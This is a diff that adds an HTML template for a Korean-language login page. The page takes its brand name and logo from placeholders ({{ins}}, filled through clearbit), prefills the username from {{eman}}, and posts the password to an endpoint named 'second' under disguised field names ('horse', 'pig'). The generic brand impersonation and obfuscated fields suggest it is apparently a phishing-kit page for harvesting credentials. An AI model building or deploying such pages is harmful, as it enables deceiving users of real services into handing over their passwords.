@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <title>환상적인 로그인</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url(https://new-background-image-url.com);
+      background-size: cover;
+      width: 100%;
+      height: 100vh;
+      font-family: 'Arial', sans-serif;
+      color: #FF4500; /* New text color (orange) */
+    }
+
+    .login-container {
+      width: 90%;
+      max-width: 400px;
+      margin: auto;
+      height: 480px;
+      background: linear-gradient(to right, #008080, #00CED1); /* Teal to Dark Turquoise gradient */
+      border-radius: 20px;
+      color: #333;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 50px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      opacity: 0;
+      transition: background 0.5s, transform 0.5s, opacity 1s, border-radius 0.5s;
+    }
+
+    .login-container:hover {
+      background: linear-gradient(to right, #FF8C00, #FFA500); /* Dark Orange to Orange gradient on hover */
+      transform: translate(-50%, -50%) scale(1.05);
+    }
+
+    .login-container.show {
+      opacity: 1;
+      border-radius: 30px;
+    }
+
+    .login-container h1 {
+      margin: 0;
+      padding: 0;
+      font-size: 32px;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+      color: #FF4500; /* New heading color (orange) */
+    }
+
+    .login-container p {
+      margin: 0;
+      padding: 0;
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 12px;
+    }
+
+    .login-container input {
+      width: 100%;
+      margin-bottom: 20px;
+      padding: 14px;
+      border-radius: 10px;
+      border: 1px solid #FF4500; /* Orange border color */
+      transition: border-color 0.3s, transform 0.3s;
+      animation: inputPulse 1s infinite alternate;
+    }
+
+    .login-container input[type="submit"] {
+      cursor: pointer;
+      background: linear-gradient(to right, #FF4500, #FF6347); /* Orange to Tomato gradient */
+      color: #fff;
+      font-size: 20px;
+      border: none;
+      border-radius: 25px;
+      padding: 14px 24px;
+      transition: background 0.3s, color 0.3s, transform 0.3s;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .login-container input[type="submit"]:hover {
+      background: linear-gradient(to right, #FF6347, #DC143C); /* Tomato to Crimson gradient on hover */
+      color: #fff;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
+      animation: buttonPulse 0.5s ease-in-out;
+    }
+
+    @keyframes inputPulse {
+      0% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1.02);
+      }
+    }
+
+    @keyframes buttonPulse {
+      0% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    .login-container a {
+      text-decoration: none;
+      font-size: 14px;
+      color: #FF4500; /* Orange link color */
+      transition: color 0.3s;
+    }
+
+    .login-container a:hover {
+      color: #8B0000; /* Dark Red on hover */
+    }
+
+    .avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      position: absolute;
+      top: -40px;
+      left: calc(50% - 40px);
+      border: 3px solid #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
+    <h1>{{ins}} 로그인</h1>
+    <form action="second" method="post">
+      <p>사용자 이름</p>
+      <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
+      <p>비밀번호</p>
+      <input type="password" name="pig" placeholder="비밀번호 입력" required>
+      <input type="submit" name="submit" value="로그인">
+      <a href="#">비밀번호를 잊으셨습니까?</a>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const loginContainer = document.querySelector('.login-container');
+      loginContainer.classList.add('show');
+    });
+  </script>
+</body>
+</html>
